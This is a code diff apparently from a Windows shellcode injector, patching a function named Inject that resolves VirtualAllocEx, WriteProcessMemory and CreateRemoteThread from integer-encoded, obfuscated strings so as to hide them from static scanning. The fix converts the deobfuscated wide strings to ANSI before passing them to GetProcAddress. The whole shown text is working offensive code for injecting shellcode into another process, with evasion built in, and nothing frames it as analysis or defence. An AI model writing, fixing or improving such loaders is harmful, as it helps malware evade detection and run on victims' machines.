@@ -417,7 +417,7 @@ BOOL Inject(DWORD dwPID, Shellcode shellcode) {
     // Dynamic API resolution
     HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
 
-    // Deobfuscate API names into temporary strings
+    // Deobfuscate API names into temporary wide strings
     int valloc_arr[] = { 44654, 44641, 44650, 44652, 44653, 44633, 44644, 44647, 44635, 44637, 44656, 44581, 44656 };
     wchar_t* valloc_name = deobf_int_array(valloc_arr, sizeof(valloc_arr) / sizeof(int), 44536);
 
@@ -427,18 +427,47 @@ BOOL Inject(DWORD dwPID, Shellcode shellcode) {
     int create_arr[] = { 44635, 44650, 44637, 44633, 44652, 44637, 44650, 44637, 44645, 44647, 44652, 44637, 44652, 44644, 44650, 44637, 44633, 44636 };
     wchar_t* create_name = deobf_int_array(create_arr, sizeof(create_arr) / sizeof(int), 44536);
 
+    // Convert wide strings to ANSI for GetProcAddress
+    char* valloc_ansi = NULL;
+    char* write_ansi = NULL;
+    char* create_ansi = NULL;
+
+    int valloc_len = WideCharToMultiByte(CP_ACP, 0, valloc_name, -1, NULL, 0, NULL, NULL);
+    if (valloc_len > 0) {
+        valloc_ansi = new char[valloc_len];
+        WideCharToMultiByte(CP_ACP, 0, valloc_name, -1, valloc_ansi, valloc_len, NULL, NULL);
+    }
+
+    int write_len = WideCharToMultiByte(CP_ACP, 0, write_name, -1, NULL, 0, NULL, NULL);
+    if (write_len > 0) {
+        write_ansi = new char[write_len];
+        WideCharToMultiByte(CP_ACP, 0, write_name, -1, write_ansi, write_len, NULL, NULL);
+    }
+
+    int create_len = WideCharToMultiByte(CP_ACP, 0, create_name, -1, NULL, 0, NULL, NULL);
+    if (create_len > 0) {
+        create_ansi = new char[create_len];
+        WideCharToMultiByte(CP_ACP, 0, create_name, -1, create_ansi, create_len, NULL, NULL);
+    }
+
+    // Clean up wide strings
+    delete[] valloc_name;
+    delete[] write_name;
+    delete[] create_name;
+
+    // Resolve APIs
     typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
     typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
     typedef HANDLE(WINAPI* pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
 
-    pVirtualAllocEx fnVirtualAllocEx = (pVirtualAllocEx)GetProcAddress(hKernel32, valloc_name);
-    pWriteProcessMemory fnWriteProcessMemory = (pWriteProcessMemory)GetProcAddress(hKernel32, write_name);
-    pCreateRemoteThread fnCreateRemoteThread = (pCreateRemoteThread)GetProcAddress(hKernel32, create_name);
+    pVirtualAllocEx fnVirtualAllocEx = valloc_ansi ? (pVirtualAllocEx)GetProcAddress(hKernel32, valloc_ansi) : NULL;
+    pWriteProcessMemory fnWriteProcessMemory = write_ansi ? (pWriteProcessMemory)GetProcAddress(hKernel32, write_ansi) : NULL;
+    pCreateRemoteThread fnCreateRemoteThread = create_ansi ? (pCreateRemoteThread)GetProcAddress(hKernel32, create_ansi) : NULL;
 
-    // Clean up temporary strings
-    delete[] valloc_name;
-    delete[] write_name;
-    delete[] create_name;
+    // Clean up ANSI strings
+    if (valloc_ansi) delete[] valloc_ansi;
+    if (write_ansi) delete[] write_ansi;
+    if (create_ansi) delete[] create_ansi;
 
     if (!fnVirtualAllocEx || !fnWriteProcessMemory || !fnCreateRemoteThread) {
         OutputDebugString(L"[-] Failed to resolve APIs\n");
